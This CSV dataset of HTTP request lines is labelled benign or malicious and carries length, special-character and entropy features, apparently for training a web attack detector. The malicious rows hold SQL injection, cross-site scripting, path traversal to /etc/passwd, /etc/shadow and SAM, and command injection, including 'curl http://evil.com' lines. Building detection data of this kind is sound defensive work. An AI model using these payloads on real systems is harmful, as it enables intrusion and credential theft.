payload,label,length,special_ratio,entropy
GET /about.html HTTP/1.1,0,24.0,0.0,3.9701755214643453
GET /exec?cmd=hostname| curl http://evil.com HTTP/1.1,1,53.0,0.018867924528301886,4.66632304878036
GET /dashboard?limit=10&filter=active HTTP/1.1,0,46.0,0.021739130434782608,4.631832608042798
GET /post?q=%3Cscript%3Ealert('XSS')%3C/script%3E HTTP/1.1,1,58.0,0.06896551724137931,4.710923667317557
GET /profile HTTP/1.1,0,21.0,0.0,3.880179922675737
GET /api/users HTTP/1.1,0,23.0,0.0,3.849223912390625
GET /image?file=..//..//..//etc/passwd HTTP/1.1,1,47.0,0.0,4.114363650151871
GET /profile?q=<audio src=x onerror=alert(1)> HTTP/1.1,1,54.0,0.07407407407407407,4.6710111130341945
GET /profile?user=%27%20OR%20%271%27=%271%27%20-- HTTP/1.1,1,58.0,0.0,4.32143934894199
GET /login?id=123 HTTP/1.1,0,26.0,0.0,4.103909910282363
GET /products.html HTTP/1.1,0,27.0,0.0,4.208410187268527
GET /api/products HTTP/1.1,0,26.0,0.0,4.103909910282363
GET /products.html?page=1 HTTP/1.1,0,34.0,0.0,4.513645929358369
GET /download?file=../../../etc/passwd HTTP/1.1,1,47.0,0.0,4.263715777995571
GET /api/users HTTP/1.1,0,23.0,0.0,3.849223912390625
GET /search?limit=10&price=100&id=123 HTTP/1.1,0,46.0,0.043478260869565216,4.526294499949899
GET /profile HTTP/1.1,0,21.0,0.0,3.880179922675737
GET /search?filter=active HTTP/1.1,0,34.0,0.0,4.337175341123076
GET /blog?filter=active&category=electronics&size=medium HTTP/1.1,0,65.0,0.03076923076923077,4.6833591601106495
GET /index.html?filter=active HTTP/1.1,0,38.0,0.0,4.484255144794799
GET /about.html HTTP/1.1,0,24.0,0.0,3.9701755214643453
GET /login?user=' OR '1'='1'/* HTTP/1.1,1,39.0,0.1282051282051282,4.282340283509331
GET /profile?q=<svg onload=alert('XSS')> HTTP/1.1,1,49.0,0.12244897959183673,4.900025150061047
GET /profile?user=%27%20OR%201=1%20-- HTTP/1.1,1,46.0,0.0,4.5342190211803395
GET /dashboard?limit=10&q=search+term&filter=active HTTP/1.1,0,60.0,0.03333333333333333,4.702479553833678
GET /products.html?filter=active&id=123 HTTP/1.1,0,48.0,0.020833333333333332,4.746115365169274
GET /blog?sort=name&q=search+term&filter=active HTTP/1.1,0,56.0,0.03571428571428571,4.702456654541048
GET /api/user?user=' OR '1'='1 HTTP/1.1,1,39.0,0.10256410256410256,4.169766962341045
GET /index.html HTTP/1.1,0,24.0,0.0,4.053508854797679
GET /file?file=..%2F..%2F..%2Fetc%2Fpasswd HTTP/1.1,1,51.0,0.0,4.355537901604238
GET /comment?q=<textarea onfocus=alert(1) autofocus> HTTP/1.1,1,61.0,0.06557377049180328,4.615346666128008
GET /post?q=%3Cselect onfocus=alert(1) autofocus%3E HTTP/1.1,1,60.0,0.03333333333333333,4.650489295854283
GET /docs?q=search+term&category=electronics&id=123 HTTP/1.1,0,60.0,0.03333333333333333,4.711080496244278
GET /docs?page=1&filter=active HTTP/1.1,0,39.0,0.02564102564102564,4.560667282798391
GET /profile?user=%27%20OR%20%271%27=%271 HTTP/1.1,1,50.0,0.0,4.368367439558378
GET /run?cmd=hostname| curl http://evil.com HTTP/1.1,1,52.0,0.019230769230769232,4.68083298720544
GET /contact.html?price=100 HTTP/1.1,0,36.0,0.0,4.41938194564637
GET /run?cmd=hostname& cat /etc/passwd HTTP/1.1,1,47.0,0.02127659574468085,4.4955582663410985
GET /docs?id=123&page=1&price=100 HTTP/1.1,0,42.0,0.047619047619047616,4.460902768522481
GET /post?q=<input onfocus=alert(1) autofocus> HTTP/1.1,1,55.0,0.07272727272727272,4.620008750235072
GET /profile?user=' WAITFOR DELAY '00:00:05'-- HTTP/1.1,1,55.0,0.05454545454545454,4.836374832596711
GET /api/users HTTP/1.1,0,23.0,0.0,3.849223912390625
GET /about.html?id=123&q=search+term HTTP/1.1,0,45.0,0.022222222222222223,4.774860596185444
GET /products.html?color=blue&size=medium HTTP/1.1,0,50.0,0.02,4.633269689515108
GET /index.html?color=blue HTTP/1.1,0,35.0,0.0,4.514718016821338
GET /comment?q=<script>alert(document.cookie)</script> HTTP/1.1,1,63.0,0.09523809523809523,4.723411376520694
GET /search?q=<img src=x onerror=alert('XSS')> HTTP/1.1,1,55.0,0.10909090909090909,4.803642667873433
GET /about.html?limit=10 HTTP/1.1,0,33.0,0.0,4.248495255525412
GET /products.html HTTP/1.1,0,27.0,0.0,4.208410187268527
GET /blog HTTP/1.1,0,18.0,0.0,3.572431251322119
"GET /profile?user=%27%20AND%201=CONVERT(int,%20(SELECT%20@@version))-- HTTP/1.1",1,79.0,0.05063291139240506,5.115825413595278
"GET /login?user=' UNION ALL SELECT NULL,NULL-- HTTP/1.1",1,55.0,0.01818181818181818,4.56915908692362
GET /profile?q=<img src='x' onerror='alert(1)'> HTTP/1.1,1,56.0,0.14285714285714285,4.712993984287173
GET /about.html HTTP/1.1,0,24.0,0.0,3.9701755214643453
GET /api/user?user=admin'/* HTTP/1.1,1,36.0,0.027777777777777776,4.3711781263822145
GET /api/user?user=' OR 1=1 -- HTTP/1.1,1,39.0,0.02564102564102564,4.23105823222728
GET /login?user=%27%20OR%20%271%27=%271%27%20-- HTTP/1.1,1,56.0,0.0,4.287365359936823
GET /docs?filter=active&q=search+term&color=blue HTTP/1.1,0,57.0,0.03508771929824561,4.685800926704141
GET /register?sort=name HTTP/1.1,0,32.0,0.0,4.241729296672174
GET /products.html?q=search+term&id=123 HTTP/1.1,0,48.0,0.020833333333333332,4.772055208874202
GET /login?category=electronics&sort=name HTTP/1.1,0,50.0,0.02,4.4883674395583775
GET /blog HTTP/1.1,0,18.0,0.0,3.572431251322119
GET /index.html?price=100&sort=name HTTP/1.1,0,44.0,0.022727272727272728,4.680689288944332
GET /exec?cmd=hostname&& cat /etc/shadow HTTP/1.1,1,49.0,0.04081632653061224,4.38481877255418
GET /profile HTTP/1.1,0,21.0,0.0,3.880179922675737
GET /register?price=100&category=electronics HTTP/1.1,0,53.0,0.018867924528301886,4.442279596310035
GET /run?cmd=hostname| curl http://evil.com HTTP/1.1,1,52.0,0.019230769230769232,4.68083298720544
GET /file?file=../../../etc/passwd HTTP/1.1,1,43.0,0.0,4.108333720677514
GET /file?file=..;/..;/..;/etc/passwd HTTP/1.1,1,46.0,0.06521739130434782,4.188215826378304
GET /profile HTTP/1.1,0,21.0,0.0,3.880179922675737
GET /login?user=%27%20OR%20%271%27=%271%27/* HTTP/1.1,1,53.0,0.0,4.3237245227222525
GET /settings?size=medium&limit=10 HTTP/1.1,0,43.0,0.023255813953488372,4.353265557320292
GET /search HTTP/1.1,0,20.0,0.0,3.7841837197791888
GET /about.html?page=1 HTTP/1.1,0,31.0,0.0,4.324848729602135
GET /index.html?color=blue&q=search+term HTTP/1.1,0,49.0,0.02040816326530612,4.75216571132969
GET /file?file=..;/..;/..;/etc/passwd HTTP/1.1,1,46.0,0.06521739130434782,4.188215826378304
GET /dashboard?sort=name&id=123 HTTP/1.1,0,40.0,0.025,4.546439344671016
GET /command?cmd=hostname&& cat /etc/shadow HTTP/1.1,1,52.0,0.038461538461538464,4.334679141051594
GET /search?limit=10&page=1&filter=active HTTP/1.1,0,50.0,0.04,4.543465189601648
GET /settings?price=100 HTTP/1.1,0,32.0,0.0,4.265319531114783
GET /login?category=electronics&filter=active HTTP/1.1,0,54.0,0.018518518518518517,4.483976567291419
GET /download?file=..\..\..\windows\system32\config\sam HTTP/1.1,1,64.0,0.09375,4.57912973485082
GET /register?category=electronics&price=100&page=1 HTTP/1.1,0,60.0,0.03333333333333333,4.456297888280895
GET /api/products HTTP/1.1,0,26.0,0.0,4.103909910282363
GET /login?q=search+term&page=1&price=100 HTTP/1.1,0,50.0,0.04,4.678562939644916
GET /settings HTTP/1.1,0,22.0,0.0,3.788754913993502
GET /contact.html?id=123&filter=active HTTP/1.1,0,47.0,0.02127659574468085,4.60503160735656
GET /about.html?size=medium&color=blue HTTP/1.1,0,47.0,0.02127659574468085,4.60715640459294
GET /search?q=<select onfocus=alert(1) autofocus> HTTP/1.1,1,58.0,0.06896551724137931,4.586007934596238
GET /contact.html?sort=name&limit=10&id=123 HTTP/1.1,0,52.0,0.038461538461538464,4.611416824235503
GET /search HTTP/1.1,0,20.0,0.0,3.7841837197791888
GET /api/users?category=electronics HTTP/1.1,0,44.0,0.0,4.464558038845993
GET /docs?price=100 HTTP/1.1,0,28.0,0.0,4.182005814760214
GET /document?file=../../../../../../etc/passwd HTTP/1.1,1,56.0,0.0,4.0547689157515
GET /download?file=..%c0%af..%c0%af..%c0%afetc/passwd HTTP/1.1,1,62.0,0.0,4.409189053260732
GET /settings?color=blue&page=1&limit=10 HTTP/1.1,0,49.0,0.04081632653061224,4.624315456095192
GET /register?limit=10&color=blue&q=search+term HTTP/1.1,0,56.0,0.03571428571428571,4.633272672738776
GET /search?q=<textarea onfocus=alert(1) autofocus> HTTP/1.1,1,60.0,0.06666666666666667,4.604574504151557
GET /download?file=....//....//....//etc/passwd HTTP/1.1,1,56.0,0.0,3.983340344322928
GET /search?user=admin'/* HTTP/1.1,1,34.0,0.029411764705882353,4.454822399946606
GET /comment?q=<img src=x onerror=alert('XSS')> HTTP/1.1,1,56.0,0.10714285714285714,4.782639243749498
GET /search?user=%27%20OR%20%271%27=%271%27%20-- HTTP/1.1,1,57.0,0.0,4.234303777695201
GET /profile?user=%27%20OR%20%27a%27=%27a HTTP/1.1,1,50.0,0.0,4.448367439558377
GET /profile?id=123&limit=10&page=1 HTTP/1.1,0,44.0,0.045454545454545456,4.524899448665393
GET /api/products HTTP/1.1,0,26.0,0.0,4.103909910282363
GET /dashboard?category=electronics&size=medium&id=123 HTTP/1.1,0,63.0,0.031746031746031744,4.776506264900797
GET /search?q=<video><source onerror='alert(1)'> HTTP/1.1,1,57.0,0.14035087719298245,4.6858009267041405
GET /comment?q=<iframe src=javascript:alert('XSS')> HTTP/1.1,1,60.0,0.1,4.931401845392171
GET /comment?q=<img src=x onerror=alert('XSS')> HTTP/1.1,1,56.0,0.10714285714285714,4.782639243749498
GET /about.html?id=123&sort=name&filter=active HTTP/1.1,0,55.0,0.03636363636363636,4.760651250117065
GET /index.html?page=1&filter=active HTTP/1.1,0,45.0,0.022222222222222223,4.624751985026254
GET /search?limit=10&page=1 HTTP/1.1,0,36.0,0.027777777777777776,4.482289237493326
GET /api/users HTTP/1.1,0,23.0,0.0,3.849223912390625
GET /search?q=<input onfocus=alert(1) autofocus> HTTP/1.1,1,57.0,0.07017543859649122,4.700796592884374
GET /search?q=<svg onload=alert('XSS')> HTTP/1.1,1,48.0,0.125,4.871115365169274
GET /products.html?id=123 HTTP/1.1,0,34.0,0.0,4.51364592935837
GET /command?cmd=hostname$(cat /etc/passwd) HTTP/1.1,1,52.0,0.057692307692307696,4.474008227548451
GET /dashboard?filter=active HTTP/1.1,0,37.0,0.0,4.5199999871336285
GET /api/user?user=%27%20WAITFOR%20DELAY%20%2700:00:05%27-- HTTP/1.1,1,68.0,0.0,4.726737473412387
GET /ping?cmd=hostname; sleep 10 HTTP/1.1,1,41.0,0.024390243902439025,4.5706090166549025
GET /command?cmd=hostname; sleep 10 HTTP/1.1,1,44.0,0.022727272727272728,4.453416561671605
GET /login?user=%27%20OR%201=1%20-- HTTP/1.1,1,44.0,0.0,4.516027641266231
GET /run?cmd=hostname; sleep 10 HTTP/1.1,1,40.0,0.025,4.5653115322251026
GET /api/products?page=1&limit=10&sort=name HTTP/1.1,0,52.0,0.038461538461538464,4.6372817851575485
GET /dashboard?filter=active HTTP/1.1,0,37.0,0.0,4.5199999871336285
GET /api/user?user=' OR 'a'='a HTTP/1.1,1,39.0,0.10256410256410256,4.201692923824033
GET /search HTTP/1.1,0,20.0,0.0,3.7841837197791888
GET /docs HTTP/1.1,0,18.0,0.0,3.572431251322119
GET /index.html?color=blue&q=search+term HTTP/1.1,0,49.0,0.02040816326530612,4.75216571132969
GET /login?user=') OR ('1'='1 HTTP/1.1,1,38.0,0.15789473684210525,4.385956789702442
GET /contact.html?id=123&sort=name HTTP/1.1,0,43.0,0.023255813953488372,4.600456033671238
GET /post?q=<iframe src=javascript:alert('XSS')> HTTP/1.1,1,57.0,0.10526315789473684,4.902722470153268
"GET /login?user=' AND 1=CONVERT(int, (SELECT @@version))-- HTTP/1.1",1,67.0,0.07462686567164178,4.970804444409202
GET /search?category=electronics HTTP/1.1,0,41.0,0.0,4.393898955732062
GET /search?q=%3Cimg src=x onerror=alert('XSS')%3E HTTP/1.1,1,59.0,0.06779661016949153,4.869516989856459
GET /index.html HTTP/1.1,0,24.0,0.0,4.053508854797679
GET /docs HTTP/1.1,0,18.0,0.0,3.572431251322119
GET /profile?user='; DROP TABLE users-- HTTP/1.1,1,48.0,0.041666666666666664,4.629247855285172
GET /search?price=100&size=medium&q=search+term HTTP/1.1,0,56.0,0.03571428571428571,4.5788908592099045
GET /about.html?id=123&color=blue HTTP/1.1,0,42.0,0.023809523809523808,4.6061376606679545
GET /login?user=' OR '1'='1'/* HTTP/1.1,1,39.0,0.1282051282051282,4.282340283509331
GET /contact.html?limit=10&sort=name HTTP/1.1,0,45.0,0.022222222222222223,4.4724241411979575
GET /contact.html?size=medium HTTP/1.1,0,38.0,0.0,4.504120605378049
GET /profile?id=123&price=100&page=1 HTTP/1.1,0,45.0,0.044444444444444446,4.483318029990693
GET /document?file=..//..//..//etc/passwd HTTP/1.1,1,50.0,0.0,4.250044500340504
GET /login?size=medium&sort=name&category=electronics HTTP/1.1,0,62.0,0.03225806451612903,4.606633810037928
GET /document?file=..;/..;/..;/etc/passwd HTTP/1.1,1,50.0,0.06,4.415337750470313
GET /api/products?category=electronics&filter=active&size=medium HTTP/1.1,0,73.0,0.0273972602739726,4.670511333940503
GET /about.html?id=123&color=blue&price=100 HTTP/1.1,0,52.0,0.038461538461538464,4.719294525666979
GET /login?price=100 HTTP/1.1,0,29.0,0.0,4.254195650150781
GET /download?file=..//..//..//etc/passwd HTTP/1.1,1,50.0,0.0,4.170044500340504
GET /api/users?q=search+term&sort=name&category=electronics HTTP/1.1,0,68.0,0.029411764705882353,4.590544459752975
GET /api/user?user=' OR 1=1 -- HTTP/1.1,1,39.0,0.02564102564102564,4.23105823222728
GET /api/users HTTP/1.1,0,23.0,0.0,3.849223912390625
GET /blog?limit=10 HTTP/1.1,0,27.0,0.0,4.106377316818028
GET /comment?q=<keygen onfocus=alert(1) autofocus> HTTP/1.1,1,59.0,0.06779661016949153,4.727745329236117
GET /dashboard?color=blue&page=1 HTTP/1.1,0,41.0,0.024390243902439025,4.503416638553355
GET /exec?cmd=hostname& cat /etc/passwd HTTP/1.1,1,48.0,0.020833333333333332,4.3970552088742005
GET /login?user=%27%20OR%20%271%27=%271%27%20-- HTTP/1.1,1,56.0,0.0,4.287365359936823
GET /login?page=1&limit=10 HTTP/1.1,0,35.0,0.02857142857142857,4.343289445392767
GET /api/products?category=electronics&limit=10 HTTP/1.1,0,56.0,0.017857142857142856,4.6550455468258045
GET /image?file=..%252F..%252F..%252Fetc%252Fpasswd HTTP/1.1,1,60.0,0.0,4.420869604629682
GET /api/user?user=%27%20WAITFOR%20DELAY%20%2700:00:05%27-- HTTP/1.1,1,68.0,0.0,4.726737473412387
GET /about.html?size=medium HTTP/1.1,0,36.0,0.0,4.461320140211008
GET /api/products?filter=active&size=medium HTTP/1.1,0,52.0,0.019230769230769232,4.6259338915848
GET /profile?user=' OR 1=1 -- HTTP/1.1,1,38.0,0.02631578947368421,4.343597829848841
GET /search?limit=10&category=electronics HTTP/1.1,0,50.0,0.02,4.568367439558378
GET /settings HTTP/1.1,0,22.0,0.0,3.788754913993502
GET /blog?size=medium&page=1&limit=10 HTTP/1.1,0,46.0,0.043478260869565216,4.544876086303668
GET /search?q=%3Cbody onload=alert('XSS')%3E HTTP/1.1,1,53.0,0.07547169811320754,4.9162308317584085
GET /search?q=<script>document.location='http://evil.com'</script> HTTP/1.1,1,75.0,0.08,4.773371817214928
GET /login?limit=10 HTTP/1.1,0,28.0,0.0,4.0836169753972325
GET /register?page=1&filter=active&color=blue HTTP/1.1,0,54.0,0.037037037037037035,4.531941205546659
GET /blog?category=electronics HTTP/1.1,0,39.0,0.0,4.438747090435226
GET /profile?user=admin'/* HTTP/1.1,1,35.0,0.02857142857142857,4.571860873964194
GET /search?user=' OR 'a'='a HTTP/1.1,1,37.0,0.10810810810810811,4.195675662809304
GET /index.html?filter=active&page=1&color=blue HTTP/1.1,0,56.0,0.03571428571428571,4.746924958035209
GET /about.html HTTP/1.1,0,24.0,0.0,3.9701755214643453
GET /post?q=%3Cscript%3Ealert('XSS')%3C/script%3E HTTP/1.1,1,58.0,0.06896551724137931,4.710923667317557
GET /profile?sort=name HTTP/1.1,0,31.0,0.0,4.413716068381602
GET /search?q=<keygen onfocus=alert(1) autofocus> HTTP/1.1,1,58.0,0.06896551724137931,4.745406425938248
GET /register?page=1 HTTP/1.1,0,29.0,0.0,4.090234012145144
GET /profile?category=electronics&filter=active HTTP/1.1,0,56.0,0.017857142857142856,4.489954252221581
GET /search?price=100 HTTP/1.1,0,30.0,0.0,4.1898980954642875
GET /contact.html HTTP/1.1,0,26.0,0.0,3.9500637564362093
GET /blog?q=search+term HTTP/1.1,0,32.0,0.0,4.538909765557392
GET /profile?user=1' ORDER BY 1-- HTTP/1.1,1,42.0,0.023809523809523808,4.526495328097802
GET /login?user=' OR 1=1 -- HTTP/1.1,1,36.0,0.027777777777777776,4.326465890981192
GET /profile HTTP/1.1,0,21.0,0.0,3.880179922675737
GET /settings?q=search+term&sort=name HTTP/1.1,0,46.0,0.021739130434782608,4.490740760310774
GET /comment?q=<img src='x' onerror='alert(1)'> HTTP/1.1,1,56.0,0.14285714285714285,4.662016252639434
GET /login?limit=10 HTTP/1.1,0,28.0,0.0,4.0836169753972325
GET /comment?q=%3Cimg src='x' onerror='alert(1)'%3E HTTP/1.1,1,60.0,0.1,4.737907837484891
GET /profile?limit=10 HTTP/1.1,0,30.0,0.0,4.231401845392171
GET /blog?page=1&id=123 HTTP/1.1,0,32.0,0.03125,4.351409765557392
GET /profile?user=%27%20UNION%20SELECT%20NULL-- HTTP/1.1,1,56.0,0.0,4.789148671903073
GET /search HTTP/1.1,0,20.0,0.0,3.7841837197791888
GET /index.html HTTP/1.1,0,24.0,0.0,4.053508854797679
GET /search?page=1&id=123 HTTP/1.1,0,34.0,0.029411764705882353,4.418201444127884
GET /api/user?user=1%27%20ORDER%20BY%2010-- HTTP/1.1,1,52.0,0.0,4.59448250651942
GET /blog?filter=active HTTP/1.1,0,32.0,0.0,4.413909765557392
GET /docs?filter=active&price=100&page=1 HTTP/1.1,0,49.0,0.04081632653061224,4.573494537816149
GET /api/user?user=' OR '1'='1' -- HTTP/1.1,1,43.0,0.11627906976744186,4.200007639511387
GET /search?q=%3Cselect onfocus=alert(1) autofocus%3E HTTP/1.1,1,62.0,0.03225806451612903,4.667511834405949
GET /comment?q=%3Cscript%3Ealert('XSS')%3C/script%3E HTTP/1.1,1,61.0,0.06557377049180328,4.819680984926534
GET /profile?limit=10 HTTP/1.1,0,30.0,0.0,4.231401845392171
GET /dashboard?q=search+term&page=1 HTTP/1.1,0,44.0,0.022727272727272728,4.572623663895164
GET /profile?q=<body onload=alert('XSS')> HTTP/1.1,1,50.0,0.12,4.838562939644916
GET /api/products HTTP/1.1,0,26.0,0.0,4.103909910282363
GET /profile?user=' WAITFOR DELAY '00:00:05'-- HTTP/1.1,1,55.0,0.05454545454545454,4.836374832596711
"GET /search?user=' AND 1=CONVERT(int, (SELECT @@version))-- HTTP/1.1",1,68.0,0.07352941176470588,4.99718393702361
GET /document?file=..//..//..//etc/passwd HTTP/1.1,1,50.0,0.0,4.250044500340504
GET /contact.html?q=search+term&category=electronics&price=100 HTTP/1.1,0,71.0,0.028169014084507043,4.627844127274946
GET /index.html?size=medium HTTP/1.1,0,36.0,0.0,4.363826390090815
GET /search HTTP/1.1,0,20.0,0.0,3.7841837197791888
GET /contact.html?filter=active HTTP/1.1,0,40.0,0.0,4.393942707918268
GET /about.html?sort=name&page=1&color=blue HTTP/1.1,0,52.0,0.038461538461538464,4.59882024669601
GET /run?cmd=hostname& cat /etc/passwd HTTP/1.1,1,47.0,0.02127659574468085,4.4955582663410985
GET /dashboard?sort=name&category=electronics HTTP/1.1,0,54.0,0.018518518518518517,4.587858798299508
GET /api/products?sort=name&filter=active&price=100 HTTP/1.1,0,60.0,0.03333333333333333,4.652153720356114
GET /api/users?color=blue HTTP/1.1,0,34.0,0.0,4.337175341123076
GET /image?file=..\..\..\..\..\..\etc\passwd HTTP/1.1,1,53.0,0.1320754716981132,4.043637892401607
GET /index.html?id=123&q=search+term HTTP/1.1,0,45.0,0.022222222222222223,4.730416151740998
GET /exec?cmd=hostname&& cat /etc/shadow HTTP/1.1,1,49.0,0.04081632653061224,4.38481877255418
GET /index.html?sort=name&id=123 HTTP/1.1,0,41.0,0.024390243902439025,4.637801394756451
GET /about.html HTTP/1.1,0,24.0,0.0,3.9701755214643453
GET /login?user=%27)%20OR%20(%271%27=%271 HTTP/1.1,1,50.0,0.04,4.448367439558377
GET /profile?price=100 HTTP/1.1,0,31.0,0.0,4.195816471537619
GET /settings?sort=name&filter=active HTTP/1.1,0,46.0,0.021739130434782608,4.482816239080333
GET /exec?cmd=hostname& cat /etc/passwd HTTP/1.1,1,48.0,0.020833333333333332,4.3970552088742005
GET /dashboard?id=123&sort=name&page=1 HTTP/1.1,0,47.0,0.0425531914893617,4.612787521752311
GET /blog?price=100 HTTP/1.1,0,28.0,0.0,4.253434386188785
GET /search?q=%3Cscript%3Edocument.location='http://evil.com'%3C/script%3E HTTP/1.1,1,83.0,0.024096385542168676,4.833914094018793
GET /profile?limit=10&price=100 HTTP/1.1,0,40.0,0.025,4.334183719779189
GET /dashboard?filter=active&color=blue&q=search+term HTTP/1.1,0,62.0,0.03225806451612903,4.700186536808577
GET /api/users?page=1&category=electronics&size=medium HTTP/1.1,0,63.0,0.031746031746031744,4.6290942573166225
GET /run?cmd=hostname&& cat /etc/shadow HTTP/1.1,1,48.0,0.041666666666666664,4.4803885422075345
GET /index.html?sort=name&limit=10&page=1 HTTP/1.1,0,50.0,0.04,4.633269689515109
GET /search?q=<script>alert('XSS')</script> HTTP/1.1,1,52.0,0.15384615384615385,4.704777458317682
GET /profile?q=%3Cvideo%3E%3Csource onerror='alert(1)'%3E HTTP/1.1,1,66.0,0.06060606060606061,4.745172816906116
GET /search?user=1' ORDER BY 10-- HTTP/1.1,1,42.0,0.023809523809523808,4.4788762804787545
GET /profile?user=admin'/* HTTP/1.1,1,35.0,0.02857142857142857,4.571860873964194
GET /api/products?size=medium&id=123 HTTP/1.1,0,45.0,0.022222222222222223,4.58030754058181
GET /comment?q=%3Ciframe src=javascript:alert('XSS')%3E HTTP/1.1,1,64.0,0.0625,4.991729296672174
